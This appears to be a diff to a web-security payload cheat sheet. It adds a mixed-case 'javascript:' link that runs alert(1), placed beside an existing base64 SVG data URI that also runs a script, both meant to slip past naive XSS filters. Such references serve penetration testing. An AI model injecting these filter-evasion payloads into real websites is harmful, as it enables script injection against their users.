@@ -1091,6 +1091,10 @@ Manually testing for XXE vulnerabilities generally involves
   ```HTML
   data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiLz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+
   ```
+- jAvAsCrIpT
+  ```HTML
+  <a href=\"jAvAsCrIpT:alert(1)\">payload</a>
+  ```
 
 
 
